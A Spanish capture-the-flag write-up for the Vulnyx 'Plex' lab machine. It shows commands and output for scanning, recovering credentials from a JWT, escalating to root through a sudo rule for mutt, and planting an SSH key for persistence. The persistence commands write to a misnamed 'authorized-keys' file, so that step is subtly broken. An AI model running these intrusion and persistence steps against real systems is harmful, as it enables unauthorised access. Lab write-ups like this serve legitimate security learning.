---
title: Vulnyx - Plex
author: estx
date: 2024-03-11 17:51:00 +0800
categories: [Writeup, Vulnyx, Easy]
tags: [Linux, 'Multiplexing Ports', 'Information Leaked' , 'Mutt']
math: true
mermaid: true
image:
  path: /assets/images/Vulnyx/Easy/Plex/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Plex Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **Multiplexing Ports, Mutt**


### Fase de Reconocimiento 🧣

Como primer punto, identificamos la dirección IP de la **`Máquina Vulnyx`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.61	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
```
> Con esto identificamos todos los dispositivos en nuestra red local.

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n 192.168.100.61 -oG puertos`**

  ![](/assets/images/Vulnyx/Easy/Plex/01-ports.png)

b. Vemos la version del servicio que se está ejecutando en el **puerto 21**

* **`nmap -p21 -sCV <IP> -oN versiones`**

  ![](/assets/images/Vulnyx/Easy/Plex/02-versions.png)

> Lo que más nos llama la atención aquí, es que en el **puerto 21** se está ejecutando el servicio `SSH`. Esto no hace pensar en que se configuró **`Multiplexing Ports`**, eso permite asignar múltiples servicios a un único puerto. La ventaja es que se conservan mejor los recursos de red ya que se usa una única conexión, pero, conlleva sobrecarga o congestiones. [Ports and Their Multiplexing](https://www.vskills.in/certification/tutorial/ports-and-their-multiplexing/)
{: .prompt-info }


c. Con lo anterior en mente, realizamos intentos de conexión con diferentes servicios

```bash
❯ ftp 192.168.100.61
Connected to 192.168.100.61.
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u4
------------------------------------------
❯ ssh 192.168.100.61 -p 21
root@192.168.100.61's password: 
------------------------------------------
❯ curl -s -X GET http://192.168.100.61:21

Hello Bro!
You only need a port to be happy...
```

* Al realizar un cURL nos dan una pista. Entonces seguimos investigando por la parta de un servicio HTTP

    ```bash
    ❯ dirsearch -u http://192.168.100.61:21/
    
    ...
    [14:32:39] 200 -   49B  - /index.html
    [14:32:49] 200 -   58B  - /robots.txt
    [14:32:49] 200 -    8KB - /server-status/
    [14:32:49] 200 -    8KB - /server-status
    ```

* Vemos el contenido del fichero **robots.txt**

    ```bash
    ❯ curl -s -X GET http://192.168.100.61:21/robots.txt
    User-agent: *
    Disallow: /9a618248b64db62d15b300a07b00580b
    ```

* Encontramos la ruta `/9a618248b64db62d15b300a07b00580b` y si le hacemos un cURL nos redireccionará, por lo que, habilitamos el redireccionamiento con cURL

    ```bash
    ❯ curl -s -X GET http://192.168.100.61:21/9a618248b64db62d15b300a07b00580b -L
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJpYXQiOm51bGwsImV4cCI6bnVsbCwiYXVkIjoiIiwic3ViIjoiIiwiaWQiOiIxIiwidXNlcm5hbWUiOiJtYXVybyIsInBhc3N3b3JkIjoibUB1UjAxMjMhIn0.zMeVhhqARJ6YzuMtwahGQnegFDhF7r0BCPf3H9ljDIk
    ```

d. Decodeamos el JWT en [JWT.io](https://jwt.io/)

  ![](/assets/images/Vulnyx/Easy/Plex/03-jwt.png)

    > Tenemos las credenciales de `mauro:m@uR0123!`
    {: .prompt-tip }


### Escalada de Privilegios 💹

a. Nos autenticamos como **mauro** en el servicio SSH y enumeramos permisos a nivel de sudoers

```bash
❯ sshpass -p 'm@uR0123!' ssh mauro@192.168.100.61 -p 21
mauro@plex:~$ sudo -l
Matching Defaults entries for mauro on plex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mauro may run the following commands on plex:
    (root) NOPASSWD: /usr/bin/mutt
```

> **`Mutt`:** Es un cliente de correo electrónico basado en texto (Línea de comandos) [¿Qué es Mutt?](https://es.linux-console.net/?p=640)
{: .prompt-info }

b. Iniciamos mutt como un usuario root y listamos los comandos disponibles (Lo hacemos tecleando `?`)

![](/assets/images/Vulnyx/Easy/Plex/04-list.png)

c. Ejecutamos un comando para spawnear una bash

![](/assets/images/Vulnyx/Easy/Plex/05-shell.png)

```bash
root@plex:~# cat root.txt 
943f08fb32181d5f8171332146f39e41
```

### Extras 🌟

a. Para entablar persistencia, registraremos nuestra **clave pública RSA** como claves autorizadas en el usuario root

```bash
❯ ssh-keygen
Generating public/private rsa key pair.
```

* Copiamos el contenido del archivo **id_rsa.pub** y lo colocamos en `/root/.ssh/authorized_keys`

```bash
root@plex:~# mkdir .ssh
root@plex:~# cd .ssh/
root@plex:~/.ssh# touch authorized-keys

root@plex:~/.ssh# echo -n 'ssh-rsa ...' > authorized-keys
```

b. Y ahora ya podemos autenticarnos directamente como **root** por SSH

```bash
❯ ssh root@192.168.100.61 -p 21 -i id_rsa
root@plex:~#
```